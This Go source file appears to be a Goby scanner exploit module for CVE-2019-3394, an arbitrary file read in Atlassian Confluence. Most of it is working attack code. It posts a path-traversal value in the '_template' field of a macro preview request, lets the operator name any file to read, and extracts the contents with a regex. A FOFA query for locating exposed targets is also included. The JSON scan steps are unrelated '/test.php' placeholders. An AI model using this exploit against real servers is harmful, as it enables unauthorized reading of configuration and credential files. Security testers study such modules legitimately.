package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "AtlassianConfluence preview File Read Vulnerability(CVE-2019-3394)",
    "Description": "<p>Confluence is a team workspace where knowledge and collaboration meet. Dynamic pages give your team a place to create, capture, and collaborate on any project or idea. Spaces help your team structure, organize, and share work, so every team member has visibility into institutional knowledge and access to the information they need to do their best work.</p>",
    "Product": "ATLASSIAN-Confluence",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-09-25",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "title=\"登录\" && title=\"Confluence\"",
    "GobyQuery": "title=\"登录\" && title=\"Confluence\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.atlassian.com/zh/software/confluence\">https://www.atlassian.com/zh/software/confluence</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2019-3394"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "AtlassianConfluence preview 文件读取漏洞（CVE-2019-3394）",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Confluence 是一个团队工作区，可有效融合知识与协作。动态页面为您的团队提供一个场所，可用来创建、收集和协同处理任何项目或创意。空间有助于您的团队构造、整理和共享工作，让每一位团队成员能够洞悉系统知识，并且访问实现最佳工作成果所需的信息。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.atlassian.com/zh/software/confluence\">https://www.atlassian.com/zh/software/confluence</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "AtlassianConfluence preview File Read Vulnerability(CVE-2019-3394)",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Confluence is a team workspace where knowledge and collaboration meet. Dynamic pages give your team a place to create, capture, and collaborate on any project or idea. Spaces help your team structure, organize, and share work, so every team member has visibility into institutional knowledge and access to the information they need to do their best work.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://www.atlassian.com/zh/software/confluence\">https://www.atlassian.com/zh/software/confluence</a><a href=\"http://www.slmobile.cn/web/index.php\"></a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`

	postOrGet_lQikBYoc := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		ref := fmt.Sprintf("http://%s/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&", hostInfo.HostInfo)
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/json; charset=utf-8",
			"Referer":      ref,
		}

		rawPayload := fmt.Sprintf("{\"contentId\": \"786458\", \"macro\":{\"name\": \"widget\", \"body\":\"\", \"params\":{\"url\": \"https://www.viddler.com/v/23464dc6\", \"width\": \"1000\",\" height\": \"1000\",\"_template\":\"%s\"}}}", filePath)
		urlPost := "/rest/tinymce/1/macro/preview"

		resp, err := setPostRequest(hostInfo, urlPost, rawPayload, defineHeader)

		if err != nil || resp == nil {
			return "", err
		}
		if resp.StatusCode != 200 {
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/rest/tinymce/1/macro/preview"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../web.xml": "<web-app",
			}
			// 函数继承
			fileReadFunc := postOrGet_lQikBYoc

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"../web.xml", "<?xml"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_lQikBYoc

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular := `<div class="wiki-content">([\s\S]*?)<\/div>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			output, err := makeRegular(resp, regular)

			expResult.Success = true
			expResult.Output = output
			return expResult
		},
	))
}
